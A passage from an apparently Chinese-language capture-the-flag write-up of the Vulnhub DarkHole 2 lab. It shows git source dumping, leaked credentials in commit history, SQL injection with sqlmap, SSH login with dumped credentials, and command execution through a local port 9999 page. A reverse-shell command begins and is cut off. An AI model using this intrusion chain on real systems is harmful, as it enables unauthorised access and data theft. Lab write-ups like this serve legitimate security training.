class=\"hljs-number\"\u003e.185\u003c/span\u003e/.git/refs/tags/                     \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  465B  - /.git/refs/               \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e10B  - /.idea/                                                                        \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  316B  - /.idea  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.185\u003c/span\u003e/.idea/                                       \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  192B  - /.idea/modules.xml                                                             \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  926B  - /.idea/workspace.xml                                                           \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  317B  - /config  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.185\u003c/span\u003e/config/                                     \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  457B  - /config/                                                                       \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e34\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   11B  - /dashboard.php                                                                 \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  456B  - /js/                                                                           \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  484B  - /login.php                                                                     \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e -    0B  - /logout.php  -\u003e  index.php                                                     \n[\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:03] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  316B  - /style  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.185\u003c/span\u003e/style/\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e清一色的\u003ccode\u003e.git\u003c/code\u003e 可以尝试有没有\u003ccode\u003e.git\u003c/code\u003e源码泄露\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003econfig/\u003c/code\u003e 应该是配置文件\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e测试是否存在源码泄露\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.freebuf.com/articles/web/346607.html\"\u003ehttps://www.freebuf.com/articles/web/346607.html\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e因为我们找到了\u003ccode\u003e.git\u003c/code\u003e ,所以我们要针对\u003ccode\u003egit\u003c/code\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e访问\u003ccode\u003e/.git/config\u003c/code\u003e 存在该目录，存在源码泄露漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e[core]\n\trepositoryformatversion = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n\tfilemode = false\n\tbare = false\n\tlogallrefupdates = true\n\tsymlinks = false\n\tignorecase = true\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用工具 \u003cstrong\u003e\u003ccode\u003egit-dumper\u003c/code\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/arthaud/git-dumper\"\u003ehttps://github.com/arthaud/git-dumper\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e使用\u003ccode\u003epip install git-dumper\u003c/code\u003e 安装\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egit-dumper http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.185\u003c/span\u003e/.git/ ./\u003cspan class=\"hljs-number\"\u003e185\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将所有源码文件下载下来了，下载到当前目录的\u003ccode\u003e185\u003c/code\u003e文件夹里\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003els -al ./\u003cspan class=\"hljs-number\"\u003e185\u003c/span\u003e\n//\ndrwxr-xr-x \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e月 \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e日 01:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e .\ndrwxr-xr-x \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e月 \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e日 01:\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e ..\ndrwxr-xr-x \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e月 \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e日 01:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e config\n-rw-r--r-- \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e5578\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e月 \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e日 01:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e dashboard.php\ndrwxr-xr-x \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e月 \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e日 01:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e .git\ndrwxr-xr-x \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e月 \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e日 01:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e .idea\n-rw-r--r-- \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e1094\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e月 \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e日 01:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e index.php\ndrwxr-xr-x \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e月 \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e日 01:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e js\n-rw-r--r-- \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e1493\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e月 \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e日 01:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e login.php\n-rw-r--r-- \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e179\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e月 \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e日 01:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e logout.php\ndrwxr-xr-x \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e月 \u003cspan class=\"hljs-number\"\u003e9\u003c/span\u003e日 01:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e style\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e代码审计\u003c/h2\u003e\n\u003cp\u003e上面已将源码文件下载了，现在开始要代码审计\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003econfig.php\u003c/code\u003e文件，是数据库配置文件，用户名为\u003ccode\u003eroot\u003c/code\u003e但是密码为\u003ccode\u003e空\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u0026#x3C;?php\n$connect = new mysqli(\u003cspan class=\"hljs-string\"\u003e\"localhost\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"root\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"darkhole_2\"\u003c/span\u003e);\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003elogin.php\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u0026#x3C;?php                                                                                                                                                                                                             \nsession_start();                                                                                                                                                                                                  \nrequire \u003cspan class=\"hljs-string\"\u003e'config/config.php'\u003c/span\u003e;                                                                                                                                                                                      \n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e($_SERVER[\u003cspan class=\"hljs-string\"\u003e'REQUEST_METHOD'\u003c/span\u003e] == \u003cspan class=\"hljs-string\"\u003e'POST'\u003c/span\u003e){                                                                                                                                                                         \n    $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST[\u003cspan class=\"hljs-string\"\u003e'email'\u003c/span\u003e]));                                                                                                                               \n    $\u003cspan class=\"hljs-keyword\"\u003epass\u003c/span\u003e = mysqli_real_escape_string($connect,htmlspecialchars($_POST[\u003cspan class=\"hljs-string\"\u003e'password'\u003c/span\u003e]));                                                                                                                             \n    $check = $connect-\u003equery(\u003cspan class=\"hljs-string\"\u003e\"select * from users where email='$email' and password='$pass' and id=1\"\u003c/span\u003e);                                                                                                           \n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e($check-\u003enum_rows){\n        $_SESSION[\u003cspan class=\"hljs-string\"\u003e'userid'\u003c/span\u003e] = \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;\n        header(\u003cspan class=\"hljs-string\"\u003e\"location:dashboard.php\"\u003c/span\u003e);\n        die();\n    }\n}\n?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e应该是可以绕过的？但是我没有成功\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e进入\u003ccode\u003e185\u003c/code\u003e文件夹查看日志（因为文件夹还留着\u003ccode\u003e.git\u003c/code\u003e ,所以可以使用\u003ccode\u003egit\u003c/code\u003e命令）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egit log\n//                                     \ncommit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 (HEAD -\u003e master)\nAuthor: Jehad Alqurashi \u0026#x3C;anmar-v7@hotmail.com\u003e\nDate:   Mon Aug \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2021\u003c/span\u003e +0300\n\n    i changed login.php file \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e more secure\n\ncommit a4d900a8d85e8938d3601f3cef113ee293028e10\nAuthor: Jehad Alqurashi \u0026#x3C;anmar-v7@hotmail.com\u003e\nDate:   Mon Aug \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:06:\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2021\u003c/span\u003e +0300\n\n    I added login.php file \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e default credentials\n\ncommit aa2a5f3aa15bb402f2b90a07d86af57436d64917\nAuthor: Jehad Alqurashi \u0026#x3C;anmar-v7@hotmail.com\u003e\nDate:   Mon Aug \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:02:\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2021\u003c/span\u003e +0300\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e出现三次提交以及作者时间等\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e对比三次提交\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003egit diff\u003c/code\u003e #获得当前目录上次提交和本地索引的差距,也就是你在什么地方修改了代码.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# git diff 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4                                                                                                                     \u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# git diff a4d900a8d85e8938d3601f3cef113ee293028e10\u003c/span\u003e\n\ndiff --git a/login.php b/login.php\nindex 8a0ff67.\u003cspan class=\"hljs-number\"\u003e.0904\u003c/span\u003eb19 \u003cspan class=\"hljs-number\"\u003e100644\u003c/span\u003e\n--- a/login.php\n+++ b/login.php\n\u003cspan class=\"hljs-meta\"\u003e@@ -\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e +\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e @@\u003c/span\u003e\n session_start();\n require \u003cspan class=\"hljs-string\"\u003e'config/config.php'\u003c/span\u003e;\n \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e($_SERVER[\u003cspan class=\"hljs-string\"\u003e'REQUEST_METHOD'\u003c/span\u003e] == \u003cspan class=\"hljs-string\"\u003e'POST'\u003c/span\u003e){\n-    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e($_POST[\u003cspan class=\"hljs-string\"\u003e'email'\u003c/span\u003e] == \u003cspan class=\"hljs-string\"\u003e\"lush@admin.com\"\u003c/span\u003e \u0026#x26;\u0026#x26; $_POST[\u003cspan class=\"hljs-string\"\u003e'password'\u003c/span\u003e] == \u003cspan class=\"hljs-string\"\u003e\"321\"\u003c/span\u003e){\n+    $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST[\u003cspan class=\"hljs-string\"\u003e'email'\u003c/span\u003e]));\n+    $\u003cspan class=\"hljs-keyword\"\u003epass\u003c/span\u003e = mysqli_real_escape_string($connect,htmlspecialchars($_POST[\u003cspan class=\"hljs-string\"\u003e'password'\u003c/span\u003e]));\n+    $check = $connect-\u003equery(\u003cspan class=\"hljs-string\"\u003e\"select * from users where email='$email' and password='$pass' and id=1\"\u003c/span\u003e);\n+    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e($check-\u003enum_rows){\n         $_SESSION[\u003cspan class=\"hljs-string\"\u003e'userid'\u003c/span\u003e] = \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e;\n         header(\u003cspan class=\"hljs-string\"\u003e\"location:dashboard.php\"\u003c/span\u003e);\n         die();\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以看到 \u003ccode\u003e-    if($_POST['email'] == \"lush@admin.com\" \u0026#x26;\u0026#x26; $_POST['password'] == \"321\")\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e出现了邮箱以及密码，可以尝试登陆后台\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用的得到账号密码登录后台，成功进入\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e利用后台\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e使用的得到账号密码登录后台，成功进入后台\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDarkHole%202/image77.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eurl\u003c/code\u003e是\u003ccode\u003e/dashboard.php?id=1\u003c/code\u003e ，像是存在\u003ccode\u003esql\u003c/code\u003e注入，可以尝试下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e/dashboard.php?\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e' # 页面空白\n/dashboard.php?id=1'\u003c/span\u003e--+ \u003cspan class=\"hljs-comment\"\u003e# 成功闭合，存在注入\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e就不使用手工注入了，直接上\u003ccode\u003esqlmap\u003c/code\u003e ，记得要想拿到\u003ccode\u003ecookie\u003c/code\u003e ，不然没有登陆状态\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003esqlmap -u http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.185\u003c/span\u003e/dashboard.php?\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e --cookie PHPSESSID=n22sg8e16sjbgs2c7g7kffofmf -batch\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e爆出两张表 \u003ccode\u003eusers\u003c/code\u003e 以及\u003ccode\u003essh\u003c/code\u003e ，\u003ccode\u003essh\u003c/code\u003e应该是能使用 \u003ccode\u003essh\u003c/code\u003e登录的用户，两张表的数据我们都\u003ccode\u003edump\u003c/code\u003e下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# users\u003c/span\u003e\n+----+----------------+-------------------------------------------+----------+-----------------------------+----------------+\n| \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e | email          | address                                   | password | username                    | contact_number |\n+----+----------------+-------------------------------------------+----------+-----------------------------+----------------+\n| \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e  | lush@admin.com |  Street, Pincode, Province/State, Country | \u003cspan class=\"hljs-number\"\u003e321\u003c/span\u003e      | Jehad Alqurashiasddasdasdas | \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e              |\n+----+----------------+-------------------------------------------+----------+-----------------------------+----------------+\n\u003cspan class=\"hljs-comment\"\u003e# ssh\u003c/span\u003e\n+----+------+--------+\n| \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e | \u003cspan class=\"hljs-keyword\"\u003epass\u003c/span\u003e | user   |\n+----+------+--------+\n| \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e  | fool | jehad  |\n+----+------+--------+\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e我们拿\u003ccode\u003essh\u003c/code\u003e表的用户去登陆下\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权 - jehad用户\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e我们拿\u003ccode\u003essh\u003c/code\u003e表的用户去登陆下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003essh jehad@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.185\u003c/span\u003e                \njehad@darkhole:~$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得\u003ccode\u003eshell\u003c/code\u003e！！！\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejehad@darkhole:~$ whoami\njehad\njehad@darkhole:~$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e1001\u003c/span\u003e(jehad) gid=\u003cspan class=\"hljs-number\"\u003e1001\u003c/span\u003e(jehad) groups=\u003cspan class=\"hljs-number\"\u003e1001\u003c/span\u003e(jehad)\njehad@darkhole:~$ uname -a\nLinux darkhole \u003cspan class=\"hljs-number\"\u003e5.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e81\u003c/span\u003e-generic \u003cspan class=\"hljs-comment\"\u003e#91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e寻找敏感文件\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003e/home/losy\u003c/code\u003e 目录下存在\u003ccode\u003euser.txt\u003c/code\u003e 是\u003ccode\u003eflag\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eehad@darkhole:/home/losy$ cat user.txt\nDarkHole{\u003cspan class=\"hljs-string\"\u003e'This_is_the_life_man_better_than_a_cruise'\u003c/span\u003e}\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e寻找SUID文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejehad@darkhole:/home/losy$ find / -perm -u=s -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e f \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\u003e/dev/null                                                                                                                                   02:06:\u003cspan class=\"hljs-number\"\u003e46\u003c/span\u003e [\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e65\u003c/span\u003e]\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/sudo                                                                                                                                                                                                     \n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/passwd                                                                                                                                                                                                   \n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/chfn                                                                                                                                                                                                     \n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/chsh\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/fusermount\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/gpasswd\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/pkexec\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/newgrp\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/umount\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/mount\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/su\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/at\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-\u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e/dbus-daemon-launch-helper\n/usr/lib/policykit-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e/polkit-agent-helper-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/snapd/snap-confine\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e想尝试\u003ccode\u003esnapd\u003c/code\u003e 提权的，但是版本对不上\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看\u003ccode\u003ebash\u003c/code\u003e历史记录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejehad@darkhole:~$ cat .bash_history \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubDarkHole%202/image78.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e发现执行了很多 \u003ccode\u003ecurl \"http://127.0.0.1:9999/?cmd=\u0026#x3C;命令\u003e\"\u003c/code\u003e  之类的，估计\u003ccode\u003e9999\u003c/code\u003e端口下是一个能进行\u003ccode\u003eRCE\u003c/code\u003e的页面\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e我们也尝试执行下\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e先试试\u003ccode\u003eid\u003c/code\u003e ，发现是\u003ccode\u003elosy\u003c/code\u003e的权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejehad@darkhole:~$ curl http://\u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e9999\u003c/span\u003e/?cmd=\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nParameter GET[\u003cspan class=\"hljs-string\"\u003e'cmd'\u003c/span\u003e]uid=\u003cspan class=\"hljs-number\"\u003e1002\u003c/span\u003e(losy) gid=\u003cspan class=\"hljs-number\"\u003e1002\u003c/span\u003e(losy) groups=\u003cspan class=\"hljs-number\"\u003e1002\u003c/span\u003e(losy)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e获得\u003ccode\u003elosy\u003c/code\u003e用户的权限\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e跟着反弹shell命令\u003c/p\u003e\n\u003cp\u003e因为靶机的\u003ccode\u003enc\u003c/code\u003e没有\u003ccode\u003e-e\u003c/code\u003e参数，只能通过其他方式来反弹\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# 通过shell\u003c/span\u003e\nbash -c \u003cspan class=\"hljs-string\"\u003e'bash -i \u003e\u0026#x26; 